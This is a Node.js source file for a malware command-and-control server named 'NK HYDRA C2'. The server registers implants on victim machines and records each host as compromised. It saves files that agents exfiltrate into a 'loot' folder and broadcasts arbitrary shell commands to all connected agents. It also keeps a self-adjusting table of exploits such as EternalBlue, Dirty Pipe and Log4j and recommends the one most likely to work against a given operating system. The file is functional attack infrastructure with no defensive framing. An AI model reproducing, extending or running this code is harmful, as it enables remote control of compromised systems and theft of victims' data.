// NK HYDRA C2 SERVER v11.0 (SINGULARITY HIVE)
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { 
    cors: { origin: "*" }, 
    maxHttpBufferSize: 1e8
}); 

const LOOT_DIR = path.join(__dirname, 'loot');
if (!fs.existsSync(LOOT_DIR)) fs.mkdirSync(LOOT_DIR);

// 1. CMDB (Targets)
const CMDB_FILE = path.join(__dirname, 'cmdb.json');
let targets = {}; 
if (fs.existsSync(CMDB_FILE)) { try { targets = JSON.parse(fs.readFileSync(CMDB_FILE)); } catch(e){} }

// 2. BRAIN (Knowledge Base / Strategic Learning)
const BRAIN_FILE = path.join(__dirname, 'brain.json');
let knowledge_base = {
    exploits: {
        "Windows": { "smb_eternal": 0.8, "rdp_blue": 0.5 },
        "Linux": { "dirty_pipe": 0.9, "log4j": 0.7 }
    },
    history: []
};
if (fs.existsSync(BRAIN_FILE)) { try { knowledge_base = JSON.parse(fs.readFileSync(BRAIN_FILE)); } catch(e){} }

const saveDB = () => {
    fs.writeFileSync(CMDB_FILE, JSON.stringify(targets, null, 2));
    fs.writeFileSync(BRAIN_FILE, JSON.stringify(knowledge_base, null, 2));
};

app.use(cors());
app.use(express.json());

let agents = new Map();

// Helper to broadcast status
const broadcastState = () => {
    io.emit('status', { agents: agents.size, targets: targets });
};

// API: THREAT INTEL FEED
app.post('/api/intel/feed', (req, res) => {
    // Ingest new CVEs or Threat Data
    const feed = req.body;
    io.emit('log', `[INTEL] New Threat Feed Received: ${feed.cve_id || 'Unknown'}`);
    // Agents could subscribe to this via socket
    io.emit('intel_update', feed);
    res.json({ status: 'ok' });
});

// API: STRATEGY REQUEST
app.get('/api/strategy/:os', (req, res) => {
    const os = req.params.os;
    const recs = knowledge_base.exploits[os] || {};
    // Return best exploit based on probability score
    const best = Object.entries(recs).sort((a,b) => b[1] - a[1])[0];
    res.json({ recommended_vector: best ? best[0] : 'scan_only' });
});

io.on('connection', (socket) => {
    broadcastState();

    socket.on('identify', (data) => {
        if (data.type === 'agent') {
            const agentInfo = { ...data, socketId: socket.id, ip: socket.handshake.address.replace('::ffff:', '') };
            agents.set(data.id, agentInfo);
            
            if (!targets[agentInfo.ip]) {
                targets[agentInfo.ip] = { ip: agentInfo.ip, os: data.os, status: 'compromised', vulns: [], openPorts: [] };
            } else {
                targets[agentInfo.ip].status = 'compromised';
            }
            saveDB();

            console.log(`[+] AGENT: ${data.id}`);
            io.emit('log', `[SYSTEM] AGENT CONNECTED: ${data.id}`);
            broadcastState();
        } 
    });

    socket.on('stream_log', (data) => {
        io.emit('log', `[${data.from}][${data.type}] ${data.output}`);
    });

    // LEARNING PROTOCOL
    socket.on('learn', (data) => {
        const { vector, success, os } = data;
        io.emit('log', `[LEARN] Agent reported ${success ? 'SUCCESS' : 'FAIL'} on ${vector}`);
        
        if (!knowledge_base.exploits[os]) knowledge_base.exploits[os] = {};
        const current = knowledge_base.exploits[os][vector] || 0.5;
        
        // Adjust weight
        knowledge_base.exploits[os][vector] = success ? Math.min(current + 0.1, 1.0) : Math.max(current - 0.1, 0.0);
        knowledge_base.history.push({ ts: Date.now(), ...data });
        saveDB();
    });

    socket.on('file_exfil', (data) => {
        try {
            const safeName = path.basename(data.filename).replace(/[^a-zA-Z0-9._-]/g, '_');
            const filePath = path.join(LOOT_DIR, `${data.from}_${Date.now()}_${safeName}`);
            fs.writeFileSync(filePath, Buffer.from(data.data, 'base64'));
            io.emit('log', `[LOOT] Saved: ${safeName}`);
        } catch (e) {}
    });

    socket.on('cmd', (data) => {
        io.emit('exec', { cmd: data.cmd });
    });

    socket.on('disconnect', () => {
        agents.forEach((val, key) => { if (val.socketId === socket.id) agents.delete(key); });
        broadcastState();
    });
});

server.listen(process.env.PORT || 3000);